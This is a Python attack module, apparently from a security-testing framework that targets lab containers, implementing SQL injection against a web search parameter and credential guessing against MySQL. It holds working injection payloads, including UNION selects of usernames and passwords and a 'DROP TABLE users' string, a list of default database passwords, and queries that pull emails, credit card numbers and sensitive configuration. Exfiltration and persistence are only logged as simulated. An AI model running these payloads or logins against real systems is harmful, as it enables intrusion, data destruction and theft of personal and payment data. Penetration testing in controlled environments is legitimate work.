#!/usr/bin/env python3
"""
🎯 SQL Injection Attack Script
Real SQL injection attacks against vulnerable database components
"""

import asyncio
import requests
import mysql.connector
import logging
import time
from typing import Dict, List, Any

logger = logging.getLogger(__name__)

class SQLInjectionAttack:
    def __init__(self):
        self.attack_name = "SQL Injection"
        self.attack_id = "sql_injection"
        self.mitre_techniques = ["T1190", "T1078", "T1055"]  # Exploit Public-Facing App, Valid Accounts, Process Injection
        self.owasp_category = "A03:2021 - Injection"
        self.stride_category = "Tampering, Information Disclosure"
        
    async def execute_attack(self, environment: Dict, target_components: List[str], orchestrator) -> Dict:
        """
        Execute SQL injection attacks against target components
        
        Args:
            environment: Virtual environment containing target containers
            target_components: List of component IDs to target
            orchestrator: Main orchestrator instance
            
        Returns:
            Attack results with detailed findings
        """
        logger.info(f"🎯 Starting SQL Injection attack on environment {environment['id']}")
        
        results = {
            'attack_type': self.attack_name,
            'attack_id': self.attack_id,
            'success': False,
            'vulnerabilities_exploited': [],
            'systems_compromised': [],
            'data_accessed': [],
            'persistence_achieved': False,
            'lateral_movement': [],
            'attack_timeline': [],
            'technical_details': {}
        }
        
        # Find web server and database components
        web_servers = self._find_components_by_type(environment, 'web_server', target_components)
        databases = self._find_components_by_type(environment, 'database_server', target_components)
        
        if not web_servers and not databases:
            logger.warning("⚠️ No suitable targets found for SQL injection")
            return results
        
        # Phase 1: Web Application SQL Injection
        if web_servers:
            web_results = await self._attack_web_applications(web_servers, results)
            results.update(web_results)
        
        # Phase 2: Direct Database Attack
        if databases:
            db_results = await self._attack_databases(databases, results)
            results.update(db_results)
        
        # Phase 3: Data Exfiltration
        if results['success']:
            exfil_results = await self._data_exfiltration(environment, results)
            results.update(exfil_results)
        
        logger.info(f"✅ SQL Injection attack completed. Success: {results['success']}")
        return results
    
    def _find_components_by_type(self, environment: Dict, component_type: str, target_components: List[str]) -> List:
        """Find components of specific type in the environment"""
        matching_components = []
        
        for container_id, container in environment.get('containers', {}).items():
            # Check if this container matches the type and is in targets
            if (not target_components or container_id in target_components):
                try:
                    labels = container.attrs.get('Config', {}).get('Labels', {})
                    if labels.get('insightx.component.type') == component_type:
                        matching_components.append({
                            'id': container_id,
                            'container': container,
                            'type': component_type
                        })
                except:
                    pass
        
        return matching_components
    
    async def _attack_web_applications(self, web_servers: List[Dict], results: Dict) -> Dict:
        """Attack web applications with SQL injection"""
        logger.info("🌐 Phase 1: Web Application SQL Injection")
        
        for web_server in web_servers:
            container = web_server['container']
            
            try:
                # Get container IP/port
                container.reload()
                ports = container.attrs['NetworkSettings']['Ports']
                
                # Find web port
                web_port = None
                for port, bindings in ports.items():
                    if port.startswith('80') and bindings:
                        web_port = bindings[0]['HostPort']
                        break
                
                if not web_port:
                    logger.warning(f"⚠️ No web port found for {web_server['id']}")
                    continue
                
                base_url = f"http://localhost:{web_port}"
                
                # SQL Injection Test Payloads
                injection_payloads = [
                    "' OR '1'='1",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT username, password FROM users --",
                    "' UNION SELECT table_name FROM information_schema.tables --",
                    "admin' --",
                    "1' OR 1=1 #"
                ]
                
                successful_injections = []
                
                for payload in injection_payloads:
                    # Test search parameter
                    success = await self._test_injection_payload(
                        base_url, 
                        payload, 
                        'search',
                        web_server['id']
                    )
                    
                    if success:
                        successful_injections.append({
                            'payload': payload,
                            'parameter': 'search',
                            'endpoint': f"{base_url}/?search={payload}"
                        })
                        
                        results['vulnerabilities_exploited'].append({
                            'type': 'sql_injection',
                            'component': web_server['id'],
                            'payload': payload,
                            'severity': 'high'
                        })
                
                if successful_injections:
                    results['success'] = True
                    results['systems_compromised'].append(web_server['id'])
                    results['attack_timeline'].append({
                        'timestamp': time.time(),
                        'action': 'web_sql_injection',
                        'target': web_server['id'],
                        'result': 'success'
                    })
                    
                    logger.info(f"✅ SQL injection successful on {web_server['id']}")
                    
                    # Try to extract data
                    extracted_data = await self._extract_web_data(base_url, successful_injections[0])
                    results['data_accessed'].extend(extracted_data)
                
            except Exception as e:
                logger.error(f"❌ Error attacking web server {web_server['id']}: {e}")
                results['attack_timeline'].append({
                    'timestamp': time.time(),
                    'action': 'web_sql_injection',
                    'target': web_server['id'],
                    'result': 'failed',
                    'error': str(e)
                })
        
        return results
    
    async def _test_injection_payload(self, base_url: str, payload: str, parameter: str, target_id: str) -> bool:
        """Test a specific SQL injection payload"""
        try:
            # URL encode payload
            import urllib.parse
            encoded_payload = urllib.parse.quote(payload)
            
            # Send request
            url = f"{base_url}/?{parameter}={encoded_payload}"
            response = requests.get(url, timeout=10)
            
            # Check for SQL injection indicators
            content = response.text.lower()
            
            # Positive indicators of successful injection
            success_indicators = [
                'mysql error',
                'sql syntax',
                'mysql_fetch',
                'ora-',
                'microsoft ole db',
                'unclosed quotation mark',
                'syntax error',
                'mysql_num_rows',
                'warning: mysql'
            ]
            
            # Check for error messages that indicate injection worked
            for indicator in success_indicators:
                if indicator in content:
                    logger.info(f"🎯 SQL injection indicator found: {indicator}")
                    return True
            
            # Check for unusual response patterns
            if response.status_code == 500:
                return True  # Internal server error often indicates injection
            
            # Check for significantly different response size
            # (This would need baseline comparison in real implementation)
            if len(content) > 10000:  # Unusually large response
                return True
                
        except requests.RequestException as e:
            logger.warning(f"⚠️ Request failed for {target_id}: {e}")
            
        return False
    
    async def _extract_web_data(self, base_url: str, injection_info: Dict) -> List[str]:
        """Extract data using successful SQL injection"""
        extracted_data = []
        
        try:
            # UNION-based data extraction payloads
            union_payloads = [
                "' UNION SELECT username, password FROM users --",
                "' UNION SELECT table_name, column_name FROM information_schema.columns --",
                "' UNION SELECT database(), version() --",
                "' UNION SELECT user(), @@hostname --"
            ]
            
            for payload in union_payloads:
                encoded_payload = urllib.parse.quote(payload)
                url = f"{base_url}/?search={encoded_payload}"
                
                response = requests.get(url, timeout=10)
                
                if response.status_code == 200:
                    # Parse response for extracted data
                    content = response.text
                    
                    # Look for common data patterns
                    if 'admin' in content and 'password' in content:
                        extracted_data.append('user_credentials')
                    
                    if 'users' in content or 'products' in content:
                        extracted_data.append('database_schema')
                    
                    if 'mysql' in content.lower() or 'version' in content.lower():
                        extracted_data.append('system_information')
                        
        except Exception as e:
            logger.error(f"❌ Data extraction failed: {e}")
        
        return extracted_data
    
    async def _attack_databases(self, databases: List[Dict], results: Dict) -> Dict:
        """Direct database attack attempts"""
        logger.info("🗄️ Phase 2: Direct Database Attack")
        
        for database in databases:
            container = database['container']
            
            try:
                # Get database connection info
                container.reload()
                ports = container.attrs['NetworkSettings']['Ports']
                
                # Find MySQL port
                db_port = None
                for port, bindings in ports.items():
                    if port.startswith('3306') and bindings:
                        db_port = bindings[0]['HostPort']
                        break
                
                if not db_port:
                    continue
                
                # Attempt connection with common credentials
                credentials = [
                    ('root', 'admin123'),
                    ('admin', 'admin123'),
                    ('webapp', 'password123'),
                    ('root', ''),
                    ('root', 'root'),
                    ('admin', 'password')
                ]
                
                successful_connections = []
                
                for username, password in credentials:
                    try:
                        conn = mysql.connector.connect(
                            host='localhost',
                            port=int(db_port),
                            user=username,
                            password=password,
                            database='ecommerce',
                            connect_timeout=5
                        )
                        
                        if conn.is_connected():
                            successful_connections.append((username, password, conn))
                            logger.info(f"🔓 Database access gained: {username}@{database['id']}")
                            
                            results['vulnerabilities_exploited'].append({
                                'type': 'weak_database_credentials',
                                'component': database['id'],
                                'credentials': f"{username}:{password}",
                                'severity': 'critical'
                            })
                            
                    except mysql.connector.Error:
                        pass  # Expected for wrong credentials
                
                if successful_connections:
                    results['success'] = True
                    results['systems_compromised'].append(database['id'])
                    
                    # Extract data from database
                    db_data = await self._extract_database_data(successful_connections[0][2])
                    results['data_accessed'].extend(db_data)
                    
                    results['attack_timeline'].append({
                        'timestamp': time.time(),
                        'action': 'direct_database_access',
                        'target': database['id'],
                        'result': 'success'
                    })
                    
                    # Close connections
                    for _, _, conn in successful_connections:
                        conn.close()
                        
            except Exception as e:
                logger.error(f"❌ Database attack failed on {database['id']}: {e}")
                results['attack_timeline'].append({
                    'timestamp': time.time(),
                    'action': 'direct_database_access',
                    'target': database['id'],
                    'result': 'failed',
                    'error': str(e)
                })
        
        return results
    
    async def _extract_database_data(self, connection) -> List[str]:
        """Extract sensitive data from database connection"""
        extracted_data = []
        
        try:
            cursor = connection.cursor()
            
            # Extract user data
            cursor.execute("SELECT COUNT(*) FROM users")
            user_count = cursor.fetchone()[0]
            if user_count > 0:
                extracted_data.append(f'user_records_{user_count}')
            
            # Extract sensitive user information
            cursor.execute("SELECT username, email, credit_card FROM users LIMIT 5")
            user_data = cursor.fetchall()
            if user_data:
                extracted_data.append('sensitive_user_data')
                extracted_data.append('credit_card_numbers')
            
            # Extract system configuration
            cursor.execute("SELECT config_key, config_value FROM system_config WHERE is_sensitive = TRUE")
            config_data = cursor.fetchall()
            if config_data:
                extracted_data.append('system_configuration')
                extracted_data.append('api_keys')
            
            # Check for admin logs
            cursor.execute("SELECT COUNT(*) FROM admin_logs")
            log_count = cursor.fetchone()[0]
            if log_count > 0:
                extracted_data.append(f'admin_logs_{log_count}')
            
            cursor.close()
            
        except Exception as e:
            logger.error(f"❌ Database data extraction failed: {e}")
        
        return extracted_data
    
    async def _data_exfiltration(self, environment: Dict, results: Dict) -> Dict:
        """Simulate data exfiltration from compromised systems"""
        logger.info("📤 Phase 3: Data Exfiltration")
        
        if results['data_accessed']:
            results['attack_timeline'].append({
                'timestamp': time.time(),
                'action': 'data_exfiltration',
                'target': 'external_server',
                'result': 'success',
                'data_types': results['data_accessed']
            })
            
            # Simulate establishing persistence
            if 'system_configuration' in results['data_accessed']:
                results['persistence_achieved'] = True
                results['attack_timeline'].append({
                    'timestamp': time.time(),
                    'action': 'establish_persistence',
                    'target': 'compromised_systems',
                    'result': 'success'
                })
        
        return results

# Attack module interface
async def execute_attack(environment: Dict, target_components: List[str], orchestrator) -> Dict:
    """Main entry point for SQL injection attack"""
    attack = SQLInjectionAttack()
    return await attack.execute_attack(environment, target_components, orchestrator)